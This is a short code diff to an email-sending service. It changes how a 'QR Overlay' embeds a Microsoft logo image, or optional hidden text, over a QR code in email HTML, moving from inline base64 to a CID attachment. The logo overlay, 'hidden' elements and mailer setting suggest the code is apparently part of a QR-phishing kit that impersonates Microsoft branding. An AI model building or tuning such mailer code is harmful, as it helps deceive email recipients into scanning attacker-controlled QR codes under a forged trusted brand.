@@ -1146,11 +1146,10 @@ export class AdvancedEmailService {
                 console.log(`[QR Overlay] Error loading overlay image: ${err}`);
               }
               
-              // Apply overlay - EXACT positioning from main.js line 933-935
+              // Apply overlay - SINGLE CID METHOD like original main.js (no base64 duplication)
               if (hasHiddenImage && imgBuf) {
-                const base64Img = imgBuf.toString('base64');
-                hiddenImageHtml = `<img src="data:image/png;base64,${base64Img}" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
-                console.log(`[QR Overlay] Applied Microsoft logo overlay (${hiddenImgWidth}px)`);
+                hiddenImageHtml = `<img src="cid:hiddenImage" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
+                console.log(`[QR Overlay] Applied Microsoft logo overlay via CID (${hiddenImgWidth}px) - matches original main.js`);
               } else if (C.HIDDEN_TEXT) {
                 hiddenImageHtml = `<span style="position:absolute; z-index:10; top:50px; left:50%; transform:translateX(-50%); padding:2px 4px; font-size:32px; color:red;">${C.HIDDEN_TEXT}</span>`;
                 console.log(`[QR Overlay] Applied hidden text: ${C.HIDDEN_TEXT}`);
